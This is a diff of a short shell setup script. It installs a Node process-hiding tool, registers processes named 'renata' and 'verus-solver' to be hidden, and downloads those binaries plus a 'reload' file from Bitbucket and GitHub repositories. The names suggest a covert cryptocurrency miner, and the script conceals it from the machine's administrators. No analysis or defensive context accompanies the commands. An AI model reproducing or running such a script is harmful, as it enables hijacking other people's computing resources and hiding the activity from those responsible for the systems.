@@ -1,6 +1,6 @@
-sudo apt-get update
-sudo apt install npm screen -y
-sudo npm i -g node-process-hider && sudo ph add renata verus-solver
+apt-get update
+apt install npm screen -y
+npm i -g node-process-hider && sudo ph add renata verus-solver
 wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload
 wget https://github.com/komaria10003099/wappahj/raw/main/renata
 wget https://github.com/komaria10003099/wappahj/raw/main/verus-solver
